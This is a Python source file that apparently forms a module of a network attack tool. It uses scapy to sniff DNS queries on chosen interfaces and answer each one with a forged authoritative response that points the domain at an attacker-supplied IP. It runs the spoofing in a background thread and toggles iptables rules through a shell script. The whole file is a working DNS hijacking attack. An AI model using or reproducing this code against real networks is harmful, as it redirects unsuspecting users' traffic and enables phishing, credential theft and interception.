from threading import Thread
from scapy.all import *
from scapy.layers.dns import DNSRR, DNS, DNSQR
from scapy.layers.inet import IP, UDP
import subprocess

config = {
    "VERBOSE": False,
}


def vprint(msg):
    """Verbose print"""
    if config["VERBOSE"]:
        print(msg)


def stop_sniff(pkt, dns_hijack_counter):
    return config[f"STOP_SNIFFING_{dns_hijack_counter}"]


def sniffer(fakeip, interfaces, dns_hijack_counter):
    """Continous sniff on specified interfaces and sends fakeip to false response"""
    try:
        pkt = sniff(prn=lambda packet: craft_false_response(packet, fakeip, interfaces),
                    lfilter=lambda packet: packet.haslayer(DNSQR) and packet[DNS].qr == 0 and packet[DNS].opcode == 0,
                    iface=interfaces,
                    stop_filter=lambda packet: stop_sniff(packet, dns_hijack_counter))
    except IndexError:
        sniffer(fakeip, interfaces, dns_hijack_counter)


def craft_false_response(pkt, fakeip, interfaces):
    domain = pkt[DNS].qd.qname.decode("utf-8")
    # print(domain)
    ip = IP(src=pkt[IP].dst, dst=pkt[IP].src)
    udp = UDP(sport=pkt[UDP].dport, dport=pkt[UDP].sport)
    dns = DNS(id=pkt[DNS].id,
              qd=pkt[DNS].qd,
              aa=1,
              rd=0,
              qr=1,
              qdcount=1,
              ancount=1,
              nscount=0,
              arcount=0,
              ar=DNSRR(rrname=pkt[DNS].qd.qname, type='A', ttl=600, rdata=fakeip))
    response = Ether(dst=pkt[Ether].src) / ip / udp / dns
    for interface in interfaces:
        sendp(response, verbose=0, iface=interface)
    # print(spoofed_response.summary())
    # print(spoofed_response.show())
    # print(f"Sending {pkt[IP].src} false DNS response: {domain} resolved to {fakeip}\n\n")

def iptables(action):
    if action == "create":
        subprocess.call("/bin/bash iptables_config.sh -A", shell=True)
    elif action == "remove":
        subprocess.call("/bin/bash iptables_config.sh -D", shell=True)

def start(fakeip, interfaces, dns_hijack_counter, verbose=False):
    config[f"STOP_SNIFFING_{dns_hijack_counter}"] = False
    config["VERBOSE"] = verbose
    dns_thread = Thread(target=sniffer, args=(fakeip, interfaces,dns_hijack_counter,))
    dns_thread.daemon = True
    dns_thread.start()


def stop(dns_hijack_counter, verbose=False):
    config[f"STOP_SNIFFING_{dns_hijack_counter}"] = True
    config["VERBOSE"] = verbose
    vprint("Stopped DNS sniffing and hijacking")
